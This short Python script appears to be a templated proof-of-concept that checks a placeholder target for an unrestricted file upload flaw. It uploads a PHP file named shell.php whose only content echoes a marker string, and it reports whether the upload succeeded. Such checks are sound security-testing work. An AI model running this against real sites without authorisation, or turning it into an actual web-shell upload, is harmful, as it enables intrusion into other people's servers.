import sys
import requests
import requests.exceptions

def verify():
    target_url = "{{TARGET_URL}}"
    files = {'file': ('shell.php', '<?php echo "ZkUploadSuccess"; ?>', 'application/x-php')}
    
    try:
        print(f"[+] Attempting file upload at {target_url}")
        resp = requests.post(target_url, files=files, timeout=5)
        
        if resp.status_code in [200, 201]:
            print("[+] File uploaded successfully.")
            print("[?] Need to evaluate access URL (if known) to confirm execution.")
            sys.exit(0)
        else:
            print("[-] REJECTED: Upload failed.")
            sys.exit(1)
            
    except requests.exceptions.ConnectionError:
        print("[-] REJECTED: Connection refused (Sandbox is likely isolated / --network none).")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    verify()
